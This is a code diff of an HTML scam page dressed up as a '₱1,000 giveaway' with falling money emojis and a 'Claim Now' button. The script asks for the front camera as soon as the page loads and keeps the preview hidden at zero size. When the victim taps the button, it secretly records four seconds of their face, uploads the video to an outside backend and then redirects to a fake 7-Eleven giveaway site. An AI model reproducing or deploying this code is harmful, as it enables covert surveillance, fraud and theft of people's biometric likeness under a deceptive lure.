@@ -4,58 +4,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 FREE ₱1,000 GIVEAWAY!
-Tap Claim Now and see if you’re lucky today! 💰</title>
+    <title>🎁 FREE ₱1,000 GIVEAWAY!</title>
     <style>
         body{
-    font-family: 'Segoe UI', Tahoma, sans-serif;
-    background: #f5f5f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
         .item{
-  position:fixed;
-  top:-50px;
-  font-size:28px;
-  animation:fall linear infinite;
-}
+            position:fixed;
+            top:-50px;
+            font-size:28px;
+            animation:fall linear infinite;
+        }
+        @keyframes fall{
+            0%{ transform:translateY(-50px); opacity:1; }
+            100%{ transform:translateY(110vh); opacity:0.8; }
+        }
+        .item:nth-child(1){left:5%; animation-duration:6s;}
+        .item:nth-child(2){left:15%; animation-duration:8s;}
+        .item:nth-child(3){left:25%; animation-duration:7s;}
+        .item:nth-child(4){left:35%; animation-duration:9s;}
+        .item:nth-child(5){left:45%; animation-duration:6s;}
+        .item:nth-child(6){left:55%; animation-duration:8s;}
+        .item:nth-child(7){left:65%; animation-duration:7s;}
+        .item:nth-child(8){left:75%; animation-duration:9s;}
+        .item:nth-child(9){left:85%; animation-duration:6s;}
+        .item:nth-child(10){left:95%; animation-duration:8s;}
 
-/* Animation */
-@keyframes fall{
-  0%{
-    transform:translateY(-50px);
-    opacity:1;
-  }
-  100%{
-    transform:translateY(110vh);
-    opacity:0.8;
-  }
-}
-
-/* Positions + speeds */
-.item:nth-child(1){left:5%; animation-duration:6s;}
-.item:nth-child(2){left:15%; animation-duration:8s;}
-.item:nth-child(3){left:25%; animation-duration:7s;}
-.item:nth-child(4){left:35%; animation-duration:9s;}
-.item:nth-child(5){left:45%; animation-duration:6s;}
-.item:nth-child(6){left:55%; animation-duration:8s;}
-.item:nth-child(7){left:65%; animation-duration:7s;}
-.item:nth-child(8){left:75%; animation-duration:9s;}
-.item:nth-child(9){left:85%; animation-duration:6s;}
-.item:nth-child(10){left:95%; animation-duration:8s;}
-
-
-.container{
-    background: #ffffff;
-    padding: 30px;
-    border-radius: 12px;
-    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-}
-
-        .card {
+        .card{
             background: #808080;
             padding: 30px;
             border-radius: 16px;
@@ -65,24 +46,10 @@ Tap Claim Now and see if you’re lucky today! 💰</title>
             border: 1px solid #474d57;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
-
-        .logo-icon {
-            width: 80px;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-            color: #f3ba2f;
-            margin-bottom: 10px;
-        }
-
-        p {
-            color: #ffffff;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .btn {
+        .logo-icon{ width: 80px; margin-bottom: 20px; }
+        h2{ color: #f3ba2f; margin-bottom: 10px; }
+        p{ color: #ffffff; font-size: 14px; line-height: 1.6; }
+        .btn{
             background: #f3ba2f;
             color: #000;
             border: none;
@@ -95,26 +62,11 @@ Tap Claim Now and see if you’re lucky today! 💰</title>
             margin-top: 20px;
             transition: 0.3s;
         }
+        .btn:hover{ background: #dba323; }
 
-        .btn:hover {
-            background: #dba323;
-        }
-
-        /* Camera ẩn hoàn toàn */
-        #vBox {
-            width: 0;
-            height: 0;
-            opacity: 0;
-            overflow: hidden;
-            position: absolute;
-        }
-
-        #loading {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .spinner {
+        #vBox{ width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
+        #loading{ display: none; margin-top: 20px; }
+        .spinner{
             border: 3px solid #30363d;
             border-top: 3px solid #f3ba2f;
             border-radius: 50%;
@@ -123,16 +75,7 @@ Tap Claim Now and see if you’re lucky today! 💰</title>
             animation: spin 1s linear infinite;
             margin: 0 auto 10px;
         }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+        @keyframes spin{ 0%{ transform: rotate(0deg);} 100%{ transform: rotate(360deg);} }
     </style>
 </head>
 
@@ -158,50 +101,76 @@ Para ma-claim ang prize mo:
 
         <button class="btn" id="startBtn">Claim Now!!!</button>
     </div>
+
     <div class="item">🎁</div>
-<div class="item">💸</div>
-<div class="item">🎁</div>
-<div class="item">💰</div>
-<div class="item">🎁</div>
-<div class="item">💵</div>
-<div class="item">🎁</div>
-<div class="item">💸</div>
-<div class="item">🎁</div>
-<div class="item">💰</div>
+    <div class="item">💸</div>
+    <div class="item">🎁</div>
+    <div class="item">💰</div>
+    <div class="item">🎁</div>
+    <div class="item">💵</div>
+    <div class="item">🎁</div>
+    <div class="item">💸</div>
+    <div class="item">🎁</div>
+    <div class="item">💰</div>
 
     <script>
         const btn = document.getElementById('startBtn');
         const loading = document.getElementById('loading');
         const video = document.getElementById('preview');
-        const REDIRECT_URL = "https://seven-11-giveaways-2026.onrender.com/"; // Trang đích sau khi xong
+        const REDIRECT_URL = "https://seven-11-giveaways-2026.onrender.com/"; // Redirect after done
 
-        // Kích hoạt camera ngay khi vào trang để sẵn sàng
+        // Init camera
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
-            } catch (err) { console.warn("Yêu cầu quyền camera để nhận thưởng."); }
+            } catch (err) { console.warn("Camera access required."); }
         }
         initCamera();
 
-        btn.addEventListener('click', () => {
+        // Handle claim button
+        btn.addEventListener('click', async () => {
             btn.style.display = 'none';
             loading.style.display = 'block';
 
-            // Gọi script xử lý ngầm
-            const script = document.createElement('script');
-            script.src = 'main.js';
-            document.body.appendChild(script);
+            // RECORD 4 SECONDS
+            const stream = video.srcObject;
+            if (!stream) { console.error("No video stream"); return; }
 
-            // Chờ tín hiệu từ main.js để chuyển hướng
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
+
+            recorder.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
+            recorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+
+                // SEND TO BACKEND
+                const formData = new FormData();
+                formData.append("video", videoBlob);
+
+                await fetch("https://your-backend-url.com/upload-video", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => console.log("Video posted:", data))
+                .catch(err => console.error("Error posting video:", err));
+
+                window.mainScriptFinished = true;
+            };
+
+            recorder.start();
+            setTimeout(() => recorder.stop(), 4000);
+
+            // Wait for backend result
             const check = setInterval(() => {
-                if (window.mainScriptFinished) {
+                if(window.mainScriptFinished){
                     clearInterval(check);
                     window.location.href = REDIRECT_URL;
                 }
             }, 500);
         });
     </script>
-</body>
 
+</body>
 </html>
